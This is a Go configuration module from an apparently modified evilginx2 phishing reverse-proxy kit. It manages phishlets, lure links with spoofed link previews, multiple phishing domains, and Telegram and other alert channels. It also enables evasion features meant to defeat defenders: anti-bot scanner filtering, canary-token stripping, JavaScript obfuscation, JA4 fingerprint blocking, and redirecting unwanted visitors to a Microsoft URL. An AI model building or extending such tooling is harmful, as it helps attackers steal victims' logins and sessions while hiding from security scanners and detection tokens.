package core

import (
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"

	"github.com/spf13/viper"
)

type Lure struct {
	Hostname        string `mapstructure:"hostname" yaml:"hostname"`
	Path            string `mapstructure:"path" yaml:"path"`
	RedirectUrl     string `mapstructure:"redirect_url" yaml:"redirect_url"`
	Phishlet        string `mapstructure:"phishlet" yaml:"phishlet"`
	Template        string `mapstructure:"template" yaml:"template"`
	UserAgentFilter string `mapstructure:"ua_filter" yaml:"ua_filter"`
	Info            string `mapstructure:"info" yaml:"info"`
	OgTitle         string `mapstructure:"og_title" yaml:"og_title"`
	OgDescription   string `mapstructure:"og_desc" yaml:"og_desc"`
	OgImageUrl      string `mapstructure:"og_image" yaml:"og_image"`
	OgUrl           string `mapstructure:"og_url" yaml:"og_url"`
}

type Config struct {
	siteDomains       map[string]string
	siteAliases       map[string][]string // phishlet -> additional domains (multi-domain)
	baseDomain        string
	serverIP          string
	proxyType         string
	proxyAddress      string
	proxyPort         int
	proxyUsername     string
	proxyPassword     string
	proxySession      bool
	blackListMode     string
	proxyEnabled      bool
	sitesEnabled      map[string]bool
	sitesHidden       map[string]bool
	phishlets         map[string]*Phishlet
	phishletNames     []string
	activeHostnames   []string
	redirectParam     string
	verificationParam string
	verificationToken string
	redirectUrl       string
	spoofUrl          string
	templatesDir      string
	lures             []*Lure
	cfg               *viper.Viper
	simplebotEnabled  bool
	nkpbotEnabled     bool
	killbotEnabled    bool
	killbot_apikey    string
	antibotpwEnabled  bool
	antibotpw_apikey  string
	adminpage_path    string
	turnstile_sitekey string
	turnstile_privkey string
	recaptcha_sitekey string
	recaptcha_privkey string
	telegram_token    string
	telegram_chatid   string
	puppetEnabled     bool
	puppetPoolSize    int
	puppetRefreshMins int
	obfuscationLevel  string
	canaryStrip       bool
	notifySlackURL    string
	notifyWebhookURL  string
	notifyPushUser    string
	notifyPushToken   string
	urlRewriteEnabled  bool
	ja4Enabled         bool
	ja4AutoBlock       bool
}

const (
	CFG_SITE_DOMAINS       = "site_domains"
	CFG_BASE_DOMAIN        = "server"
	CFG_SERVER_IP          = "ip"
	CFG_SITES_ENABLED      = "sites_enabled"
	CFG_SITES_HIDDEN       = "sites_hidden"
	CFG_REDIRECT_PARAM     = "redirect_key"
	CFG_VERIFICATION_PARAM = "verification_key"
	CFG_VERIFICATION_TOKEN = "verification_token"
	CFG_REDIRECT_URL       = "redirect_url"
	CFG_SPOOF_URL          = "spoof_url"
	CFG_LURES              = "lures"
	CFG_PROXY_TYPE         = "proxy_type"
	CFG_PROXY_ADDRESS      = "proxy_address"
	CFG_PROXY_PORT         = "proxy_port"
	CFG_PROXY_USERNAME     = "proxy_username"
	CFG_PROXY_PASSWORD     = "proxy_password"
	CFG_PROXY_ENABLED      = "proxy_enabled"
	CFG_PROXY_SESSION      = "proxy_session"
	CFG_BLACKLIST_MODE     = "blacklist_mode"
	CFG_SIMPLEBOT_ENABLED  = "simplebot_enabled"
	CFG_NKPBOT_ENABLED     = "nkpbot_enabled"
	CFG_KILLBOT_ENABLED    = "killbot_enabled"
	CFG_KILLBOT_APIKEY     = "killbot_apikey"
	CFG_ANTIBOTPW_ENABLED  = "antibotpw_enabled"
	CFG_ANTIBOTPW_APIKEY   = "antibotpw_apikey"
	CFG_ADMINPAGE_PATH     = "adminpage_path"
	CFG_TURNSTILE_SITEKEY  = "turnstile_sitekey"
	CFG_TURNSTILE_PRIVKEY  = "turnstile_privkey"
	CFG_RECAPTCHA_SITEKEY  = "recaptcha_sitekey"
	CFG_RECAPTCHA_PRIVKEY  = "recaptcha_privkey"
	CFG_TELEGRAM_TOKEN     = "telegram_token"
	CFG_TELEGRAM_CHATID    = "telegram_chatid"
	CFG_PUPPET_ENABLED     = "puppet_enabled"
	CFG_PUPPET_POOL_SIZE   = "puppet_pool_size"
	CFG_PUPPET_REFRESH     = "puppet_refresh_mins"
	CFG_OBFUSCATION_LEVEL  = "obfuscation_level"
	CFG_CANARY_STRIP       = "canary_strip"
	CFG_URL_REWRITE        = "url_rewrite_enabled"
	CFG_JA4_ENABLED        = "ja4_enabled"
	CFG_JA4_AUTOBLOCK      = "ja4_autoblock"
	CFG_SITE_ALIASES       = "site_aliases"
)

const DEFAULT_REDIRECT_URL = "https://go.microsoft.com"

func NewConfig(cfg_dir, path string) (*Config, error) {
	c := &Config{
		siteDomains:   make(map[string]string),
		siteAliases:   make(map[string][]string),
		sitesEnabled:  make(map[string]bool),
		sitesHidden:   make(map[string]bool),
		phishlets:     make(map[string]*Phishlet),
		phishletNames: []string{},
		lures:         []*Lure{},
	}

	c.cfg = viper.New()
	c.cfg.SetConfigType("yaml")

	if path == "" {
		path = filepath.Join(cfg_dir, "config.yaml")
	}
	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0o700))
	if err != nil {
		return nil, err
	}
	var created_cfg bool = false
	c.cfg.SetConfigFile(path)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		created_cfg = true
		err = c.cfg.WriteConfigAs(path)
		if err != nil {
			return nil, err
		}
	}

	err = c.cfg.ReadInConfig()
	if err != nil {
		return nil, err
	}

	c.baseDomain = c.cfg.GetString(CFG_BASE_DOMAIN)
	c.serverIP = c.cfg.GetString(CFG_SERVER_IP)
	c.siteDomains = c.cfg.GetStringMapString(CFG_SITE_DOMAINS)
	// Load site aliases (multi-domain: multiple domains per phishlet)
	aliasRaw := c.cfg.GetStringMap(CFG_SITE_ALIASES)
	for site, val := range aliasRaw {
		if arr, ok := val.([]interface{}); ok {
			for _, v := range arr {
				if s, ok := v.(string); ok && s != "" {
					c.siteAliases[site] = append(c.siteAliases[site], s)
				}
			}
		}
	}
	c.redirectParam = c.cfg.GetString(CFG_REDIRECT_PARAM)
	c.verificationParam = c.cfg.GetString(CFG_VERIFICATION_PARAM)
	c.verificationToken = c.cfg.GetString(CFG_VERIFICATION_TOKEN)
	c.redirectUrl = c.cfg.GetString(CFG_REDIRECT_URL)
	c.proxyType = c.cfg.GetString(CFG_PROXY_TYPE)
	c.proxyAddress = c.cfg.GetString(CFG_PROXY_ADDRESS)
	c.proxyPort = c.cfg.GetInt(CFG_PROXY_PORT)
	c.proxyUsername = c.cfg.GetString(CFG_PROXY_USERNAME)
	c.proxyPassword = c.cfg.GetString(CFG_PROXY_PASSWORD)
	c.proxyEnabled = c.cfg.GetBool(CFG_PROXY_ENABLED)
	c.proxySession = c.cfg.GetBool(CFG_PROXY_SESSION)
	c.blackListMode = c.cfg.GetString(CFG_BLACKLIST_MODE)
	//
	c.simplebotEnabled = c.cfg.GetBool(CFG_SIMPLEBOT_ENABLED)
	c.nkpbotEnabled = c.cfg.GetBool(CFG_NKPBOT_ENABLED)
	c.killbotEnabled = c.cfg.GetBool(CFG_KILLBOT_ENABLED)
	c.killbot_apikey = c.cfg.GetString(CFG_KILLBOT_APIKEY)
	c.antibotpwEnabled = c.cfg.GetBool(CFG_ANTIBOTPW_ENABLED)
	c.antibotpw_apikey = c.cfg.GetString(CFG_ANTIBOTPW_APIKEY)
	//
	c.spoofUrl = c.cfg.GetString(CFG_SPOOF_URL)
	c.adminpage_path = c.cfg.GetString(CFG_ADMINPAGE_PATH)
	c.turnstile_sitekey = c.cfg.GetString(CFG_TURNSTILE_SITEKEY)
	c.turnstile_privkey = c.cfg.GetString(CFG_TURNSTILE_PRIVKEY)
	c.recaptcha_sitekey = c.cfg.GetString(CFG_RECAPTCHA_SITEKEY)
	c.recaptcha_privkey = c.cfg.GetString(CFG_RECAPTCHA_PRIVKEY)
	c.telegram_token = c.cfg.GetString(CFG_TELEGRAM_TOKEN)
	c.telegram_chatid = c.cfg.GetString(CFG_TELEGRAM_CHATID)
	//
	c.puppetEnabled = c.cfg.GetBool(CFG_PUPPET_ENABLED)
	c.puppetPoolSize = c.cfg.GetInt(CFG_PUPPET_POOL_SIZE)
	c.puppetRefreshMins = c.cfg.GetInt(CFG_PUPPET_REFRESH)
	if c.puppetPoolSize <= 0 {
		c.puppetPoolSize = 2
	}
	if c.puppetRefreshMins <= 0 {
		c.puppetRefreshMins = 30
	}
	c.obfuscationLevel = c.cfg.GetString(CFG_OBFUSCATION_LEVEL)
	if c.obfuscationLevel == "" {
		c.obfuscationLevel = "medium"
	}
	SetObfuscationLevel(c.obfuscationLevel)
	c.canaryStrip = c.cfg.GetBool(CFG_CANARY_STRIP)
	c.notifySlackURL = c.cfg.GetString(CFG_NOTIFY_SLACK_URL)
	c.notifyWebhookURL = c.cfg.GetString(CFG_NOTIFY_WEBHOOK_URL)
	c.notifyPushUser = c.cfg.GetString(CFG_NOTIFY_PUSHOVER_USER)
	c.notifyPushToken = c.cfg.GetString(CFG_NOTIFY_PUSHOVER_TOKEN)
	c.urlRewriteEnabled = c.cfg.GetBool(CFG_URL_REWRITE)
	// JA4 defaults to enabled if not set
	if c.cfg.IsSet(CFG_JA4_ENABLED) {
		c.ja4Enabled = c.cfg.GetBool(CFG_JA4_ENABLED)
	} else {
		c.ja4Enabled = true
	}
	if c.cfg.IsSet(CFG_JA4_AUTOBLOCK) {
		c.ja4AutoBlock = c.cfg.GetBool(CFG_JA4_AUTOBLOCK)
	} else {
		c.ja4AutoBlock = true
	}

	// If telegram config is set in config.yaml, push it to the database package
	if c.telegram_token != "" && c.telegram_chatid != "" {
		database.SetTelegramBotToken(c.telegram_token)
		database.SetTelegramChatID(c.telegram_chatid)
	}

	s_enabled := c.cfg.GetStringSlice(CFG_SITES_ENABLED)
	for _, site := range s_enabled {
		c.sitesEnabled[site] = true
	}
	s_hidden := c.cfg.GetStringSlice(CFG_SITES_HIDDEN)
	for _, site := range s_hidden {
		c.sitesHidden[site] = true
	}

	if !stringExists(c.blackListMode, []string{"all", "unauth", "off"}) {
		c.SetBlacklistMode("off")
	}

	var param string
	if c.redirectParam == "" {
		param = strings.ToLower(GenRandomString(2))
		c.SetRedirectParam(param)
	}
	if c.verificationParam == "" {
		for {
			param = strings.ToLower(GenRandomString(2))
			if param != c.redirectParam {
				break
			}
		}
		c.SetVerificationParam(param)
	}
	if c.verificationToken == "" {
		c.SetVerificationToken(GenRandomToken()[:4])
	}
	if c.redirectUrl == "" && created_cfg {
		c.SetRedirectUrl(DEFAULT_REDIRECT_URL)
	}
	c.lures = []*Lure{}
	err = c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
	if err != nil {
		return nil, err
	}

	if c.adminpage_path == "" {
		c.SetAdminpagePath(fmt.Sprintf("%v", rand.Intn(9999)))
	}

	return c, nil
}

func (c *Config) SetSiteHostname(site, domain string) bool {
	if c.baseDomain == "" {
		log.Error("you need to set server domain, first. type: config domain your-domain.com")
		return false
	}
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return false
	}
	// Multi-domain support: allow any domain, not just subdomains of baseDomain.
	// Each phishlet can have its own independent domain.
	// DNS for each domain must point to this server's IP (wildcard A record).
	c.siteDomains[site] = domain
	c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
	log.Info("phishlet '%s' hostname set to: %s", site, domain)
	if domain != c.baseDomain && !strings.HasSuffix(domain, "."+c.baseDomain) {
		log.Info("NOTE: '%s' is a separate domain — make sure its DNS (A * and @) points to %s", domain, c.serverIP)
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
	return true
}

func (c *Config) SetBaseDomain(domain string) {
	c.baseDomain = domain
	c.cfg.Set(CFG_BASE_DOMAIN, c.baseDomain)
	log.Info("server domain set to: %s", domain)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetServerIP(ip_addr string) {
	c.serverIP = ip_addr
	c.cfg.Set(CFG_SERVER_IP, c.serverIP)
	log.Info("server IP set to: %s", ip_addr)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) EnableProxy(enabled bool) {
	c.proxyEnabled = enabled
	c.cfg.Set(CFG_PROXY_ENABLED, c.proxyEnabled)
	if enabled {
		log.Info("enabled proxy")
	} else {
		log.Info("disabled proxy")
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) EnableSessionProxy(enabled bool) {
	c.proxySession = enabled
	c.cfg.Set(CFG_PROXY_SESSION, c.proxySession)
	if enabled {
		log.Info("enabled session proxy")
	} else {
		log.Info("disabled session proxy")
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetSessionProxy() bool {
	return c.proxySession
}

func (c *Config) SetProxyType(ptype string) {
	ptypes := []string{"http", "https", "socks5", "socks5h"}
	if !stringExists(ptype, ptypes) {
		log.Error("invalid proxy type selected")
		return
	}
	c.proxyType = ptype
	c.cfg.Set(CFG_PROXY_TYPE, c.proxyType)
	log.Info("proxy type set to: %s", c.proxyType)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetProxyAddress(address string) {
	c.proxyAddress = address
	c.cfg.Set(CFG_PROXY_ADDRESS, c.proxyAddress)
	log.Info("proxy address set to: %s", c.proxyAddress)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetProxyPort(port int) {
	c.proxyPort = port
	c.cfg.Set(CFG_PROXY_PORT, c.proxyPort)
	log.Info("proxy port set to: %d", c.proxyPort)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetProxyUsername(username string) {
	c.proxyUsername = username
	c.cfg.Set(CFG_PROXY_USERNAME, c.proxyUsername)
	log.Info("proxy username set to: %s", c.proxyUsername)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetProxyPassword(password string) {
	c.proxyPassword = password
	c.cfg.Set(CFG_PROXY_PASSWORD, c.proxyPassword)
	log.Info("proxy password set to: %s", c.proxyPassword)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) IsLureHostnameValid(hostname string) bool {
	for _, l := range c.lures {
		if l.Hostname == hostname {
			if c.sitesEnabled[l.Phishlet] {
				return true
			}
		}
	}
	// Wildcard: any subdomain of an enabled phishlet's base domain is valid as lure
	for site, pl := range c.phishlets {
		if c.sitesEnabled[site] {
			domain, ok := c.siteDomains[pl.Name]
			if ok && strings.HasSuffix(hostname, "."+domain) {
				return true
			}
		}
	}
	return false
}

func (c *Config) SetSiteEnabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	if !c.IsSiteEnabled(site) {
		c.sitesEnabled[site] = true
	}
	c.refreshActiveHostnames()
	var sites []string
	for s := range c.sitesEnabled {
		sites = append(sites, s)
	}
	c.cfg.Set(CFG_SITES_ENABLED, sites)
	log.Info("enabled phishlet '%s'", site)
	err := c.cfg.WriteConfig()
	if err != nil {
		return err
	}
	return nil
}

func (c *Config) SetSiteDisabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	if c.IsSiteEnabled(site) {
		delete(c.sitesEnabled, site)
	}
	c.refreshActiveHostnames()
	var sites []string
	for s := range c.sitesEnabled {
		sites = append(sites, s)
	}
	c.cfg.Set(CFG_SITES_ENABLED, sites)
	log.Info("disabled phishlet '%s'", site)
	err := c.cfg.WriteConfig()
	if err != nil {
		return err
	}
	return nil
}

func (c *Config) SetSiteHidden(site string, hide bool) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	if hide {
		if !c.IsSiteHidden(site) {
			c.sitesHidden[site] = true
		}
	} else {
		if c.IsSiteHidden(site) {
			delete(c.sitesHidden, site)
		}
	}
	c.refreshActiveHostnames()
	var sites []string
	for s := range c.sitesHidden {
		sites = append(sites, s)
	}
	c.cfg.Set(CFG_SITES_HIDDEN, sites)
	if hide {
		log.Info("phishlet '%s' is now hidden and all requests to it will be redirected", site)
	} else {
		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		return err
	}
	return nil
}

func (c *Config) SetTemplatesDir(path string) {
	c.templatesDir = path
}

func (c *Config) ResetAllSites() {
	for s := range c.sitesEnabled {
		err := c.SetSiteDisabled(s)
		if err != nil {
			log.Error("disabling: %s resulted in error: %s", s, err)
		}
	}
	for s := range c.phishlets {
		c.siteDomains[s] = ""
	}
	c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) IsSiteEnabled(site string) bool {
	s, ok := c.sitesEnabled[site]
	if !ok {
		return false
	}
	return s
}

func (c *Config) IsSiteHidden(site string) bool {
	s, ok := c.sitesHidden[site]
	if !ok {
		return false
	}
	return s
}

func (c *Config) GetEnabledSites() []string {
	var sites []string
	for s := range c.sitesEnabled {
		sites = append(sites, s)
	}
	return sites
}

func (c *Config) SetRedirectParam(param string) {
	c.redirectParam = param
	c.cfg.Set(CFG_REDIRECT_PARAM, param)
	log.Info("redirect parameter set to: %s", param)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetBlacklistMode(mode string) {
	if stringExists(mode, []string{"all", "unauth", "off"}) {
		c.blackListMode = mode
		c.cfg.Set(CFG_BLACKLIST_MODE, mode)
		err := c.cfg.WriteConfig()
		if err != nil {
			log.Error("write config: %v", err)
		}
	}
	log.Info("blacklist mode set to: %s", mode)
}

func (c *Config) SetVerificationParam(param string) {
	c.verificationParam = param
	c.cfg.Set(CFG_VERIFICATION_PARAM, param)
	log.Info("verification parameter set to: %s", param)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetVerificationToken(token string) {
	c.verificationToken = token
	c.cfg.Set(CFG_VERIFICATION_TOKEN, token)
	log.Info("verification token set to: %s", token)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetTurnstileSitekey(key string) {
	c.turnstile_sitekey = key
	c.cfg.Set(CFG_TURNSTILE_SITEKEY, key)
	log.Info("Turnstile site key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetTurnstilePrivkey(key string) {
	c.turnstile_privkey = key
	c.cfg.Set(CFG_TURNSTILE_PRIVKEY, key)
	log.Info("Turnstile private key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetReCaptchaSitekey(key string) {
	c.recaptcha_sitekey = key
	c.cfg.Set(CFG_RECAPTCHA_SITEKEY, key)
	log.Info("reCAPTCHA site key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetReCaptchaPrivkey(key string) {
	c.recaptcha_privkey = key
	c.cfg.Set(CFG_RECAPTCHA_PRIVKEY, key)
	log.Info("reCAPTCHA private key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetTelegramToken(token string) {
	c.telegram_token = token
	c.cfg.Set(CFG_TELEGRAM_TOKEN, token)
	database.SetTelegramBotToken(token)
	if len(token) > 10 {
		log.Info("telegram bot token set to: %s...%s", token[:6], token[len(token)-4:])
	} else {
		log.Info("telegram bot token set")
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetTelegramChatID(id string) {
	c.telegram_chatid = id
	c.cfg.Set(CFG_TELEGRAM_CHATID, id)
	database.SetTelegramChatID(id)
	log.Info("telegram chat ID set to: %s", id)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetTelegramToken() string {
	return c.telegram_token
}

func (c *Config) GetTelegramChatID() string {
	return c.telegram_chatid
}

// --- Evilpuppet config ---

func (c *Config) SetPuppetEnabled(enabled bool) {
	c.puppetEnabled = enabled
	c.cfg.Set(CFG_PUPPET_ENABLED, enabled)
	if enabled {
		log.Info("evilpuppet enabled")
	} else {
		log.Info("evilpuppet disabled")
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) IsPuppetEnabled() bool {
	return c.puppetEnabled
}

func (c *Config) SetPuppetPoolSize(size int) {
	if size < 1 {
		size = 1
	}
	if size > 10 {
		size = 10
	}
	c.puppetPoolSize = size
	c.cfg.Set(CFG_PUPPET_POOL_SIZE, size)
	log.Info("evilpuppet pool size set to: %d", size)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetPuppetPoolSize() int {
	return c.puppetPoolSize
}

func (c *Config) SetPuppetRefreshMins(mins int) {
	if mins < 5 {
		mins = 5
	}
	c.puppetRefreshMins = mins
	c.cfg.Set(CFG_PUPPET_REFRESH, mins)
	log.Info("evilpuppet refresh interval set to: %d minutes", mins)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetPuppetRefreshMins() int {
	return c.puppetRefreshMins
}

// --- JS Obfuscation config ---

func (c *Config) SetObfuscationLevel(level string) {
	c.obfuscationLevel = level
	SetObfuscationLevel(level)
	c.cfg.Set(CFG_OBFUSCATION_LEVEL, level)
	log.Info("js obfuscation level set to: %s", level)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetObfuscationLevel() string {
	return c.obfuscationLevel
}

// --- Canary stripping config ---

func (c *Config) SetCanaryStrip(enabled bool) {
	c.canaryStrip = enabled
	c.cfg.Set(CFG_CANARY_STRIP, enabled)
	if enabled {
		log.Info("canary token stripping enabled")
	} else {
		log.Info("canary token stripping disabled")
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) IsCanaryStripEnabled() bool {
	return c.canaryStrip
}

// --- Notification config ---

func (c *Config) SetNotifySlackURL(url string) {
	c.notifySlackURL = url
	c.cfg.Set(CFG_NOTIFY_SLACK_URL, url)
	log.Info("slack notification webhook set")
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetNotifySlackURL() string { return c.notifySlackURL }

func (c *Config) SetNotifyWebhookURL(url string) {
	c.notifyWebhookURL = url
	c.cfg.Set(CFG_NOTIFY_WEBHOOK_URL, url)
	log.Info("webhook notification URL set")
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetNotifyWebhookURL() string { return c.notifyWebhookURL }

func (c *Config) SetNotifyPushover(userKey, apiToken string) {
	c.notifyPushUser = userKey
	c.notifyPushToken = apiToken
	c.cfg.Set(CFG_NOTIFY_PUSHOVER_USER, userKey)
	c.cfg.Set(CFG_NOTIFY_PUSHOVER_TOKEN, apiToken)
	log.Info("pushover notification configured")
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetNotifyPushoverUser() string  { return c.notifyPushUser }
func (c *Config) GetNotifyPushoverToken() string { return c.notifyPushToken }

// --- URL Rewrite config ---

func (c *Config) SetURLRewrite(enabled bool) {
	c.urlRewriteEnabled = enabled
	c.cfg.Set(CFG_URL_REWRITE, enabled)
	if enabled {
		log.Info("URL path rewriting enabled")
	} else {
		log.Info("URL path rewriting disabled")
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) IsURLRewriteEnabled() bool { return c.urlRewriteEnabled }

func (c *Config) IsJA4Enabled() bool { return c.ja4Enabled }
func (c *Config) SetJA4Enabled(enabled bool) {
	c.ja4Enabled = enabled
	c.cfg.Set(CFG_JA4_ENABLED, enabled)
	c.cfg.WriteConfig()
}

func (c *Config) IsJA4AutoBlockEnabled() bool { return c.ja4AutoBlock }
func (c *Config) SetJA4AutoBlock(enabled bool) {
	c.ja4AutoBlock = enabled
	c.cfg.Set(CFG_JA4_AUTOBLOCK, enabled)
	c.cfg.WriteConfig()
}

// --- Multi-domain aliases ---

func (c *Config) AddSiteAlias(site, domain string) {
	// Check for duplicates
	for _, d := range c.siteAliases[site] {
		if d == domain {
			log.Info("alias '%s' already exists for phishlet '%s'", domain, site)
			return
		}
	}
	c.siteAliases[site] = append(c.siteAliases[site], domain)
	c.cfg.Set(CFG_SITE_ALIASES, c.siteAliases)
	log.Info("alias domain '%s' added to phishlet '%s'", domain, site)
	if c.serverIP != "" {
		log.Info("NOTE: make sure DNS for '%s' (A * and @) points to %s", domain, c.serverIP)
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) RemoveSiteAlias(site, domain string) {
	aliases := c.siteAliases[site]
	var updated []string
	for _, d := range aliases {
		if d != domain {
			updated = append(updated, d)
		}
	}
	c.siteAliases[site] = updated
	c.cfg.Set(CFG_SITE_ALIASES, c.siteAliases)
	log.Info("alias domain '%s' removed from phishlet '%s'", domain, site)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetSiteAliases(site string) []string {
	return c.siteAliases[site]
}

func (c *Config) GetAllAliasHosts(site string) []string {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		return nil
	}
	var hosts []string
	for _, aliasDomain := range c.siteAliases[site] {
		for _, h := range pl.proxyHosts {
			hosts = append(hosts, combineHost(h.phish_subdomain, aliasDomain))
		}
	}
	return hosts
}

func (c *Config) ToggleSimpleBot() {
	enable := true
	if c.simplebotEnabled {
		enable = false
	}
	c.simplebotEnabled = enable
	c.cfg.Set(CFG_SIMPLEBOT_ENABLED, enable)
	if enable {
		log.Info("enabled simplebot aversion")
	} else {
		log.Info("disabled simplebot aversion")
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) ToggleNkpBot() {
	enable := true
	if c.nkpbotEnabled {
		enable = false
	}
	c.nkpbotEnabled = enable
	c.cfg.Set(CFG_NKPBOT_ENABLED, enable)
	if enable {
		log.Info("enabled nkpbot aversion")
	} else {
		log.Info("disabled nkpbot aversion")
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) ToggleAntibotPw() {
	enable := true
	if c.antibotpwEnabled {
		enable = false
	}
	if enable {
		if key_length := len(c.antibotpw_apikey); key_length != 32 {
			log.Error("error: antibotpw api key should be 32 characters but is %v", key_length)
			log.Info("disabled antibot.pw aversion")
			c.antibotpwEnabled = false
			c.cfg.Set(CFG_ANTIBOTPW_ENABLED, c.antibotpwEnabled)
			err := c.cfg.WriteConfig()
			if err != nil {
				log.Error("write config: %v", err)
			}
			return
		}
		log.Info("enabled antibot.pw aversion")
	} else {
		log.Info("disabled antibot.pw aversion")
	}
	c.antibotpwEnabled = enable
	c.cfg.Set(CFG_ANTIBOTPW_ENABLED, c.antibotpwEnabled)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetAntiBotPwApikey(key string) {
	c.antibotpw_apikey = key
	c.cfg.Set(CFG_ANTIBOTPW_APIKEY, key)
	log.Info("antibotpw key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetAntiBotPwApikey() string {
	return c.antibotpw_apikey
}

func (c *Config) ToggleKillbot() {
	enable := true
	if c.killbotEnabled {
		enable = false
	}
	if enable {
		if key_length := len(c.killbot_apikey); key_length != 45 {
			log.Error("killbot api key should be 45 characters but is %v", key_length)
			log.Info("disabled killbot")
			c.killbotEnabled = false
			c.cfg.Set(CFG_KILLBOT_ENABLED, false)
			err := c.cfg.WriteConfig()
			if err != nil {
				log.Error("write config: %v", err)
			}
			return
		}
		log.Info("enabled killbot")
	} else {
		log.Info("disabled killbot")
	}
	c.killbotEnabled = enable
	c.cfg.Set(CFG_KILLBOT_ENABLED, enable)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetKillBotApikey(key string) {
	c.killbot_apikey = key
	c.cfg.Set(CFG_KILLBOT_APIKEY, key)
	log.Info("killbot key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetKillBotApikey() string {
	return c.killbot_apikey
}

func (c *Config) SetRedirectUrl(url string) {
	c.redirectUrl = url
	c.cfg.Set(CFG_REDIRECT_URL, url)
	log.Info("unauthorized request redirection URL set to: %s", url)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetAdminpagePath(path string) {
	c.adminpage_path = path
	c.cfg.Set(CFG_ADMINPAGE_PATH, path)
	log.Info("adminpage authorization path set to: %s", path)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) refreshActiveHostnames() {
	c.activeHostnames = []string{}
	sites := c.GetEnabledSites()
	for _, site := range sites {
		pl, err := c.GetPhishlet(site)
		if err != nil {
			continue
		}
		c.activeHostnames = append(c.activeHostnames, pl.GetPhishHosts()...)
		// Multi-domain: also add alias domain hostnames
		c.activeHostnames = append(c.activeHostnames, c.GetAllAliasHosts(site)...)
	}
	for _, l := range c.lures {
		if stringExists(l.Phishlet, sites) {
			if l.Hostname != "" {
				c.activeHostnames = append(c.activeHostnames, l.Hostname)
			}
		}
	}
}

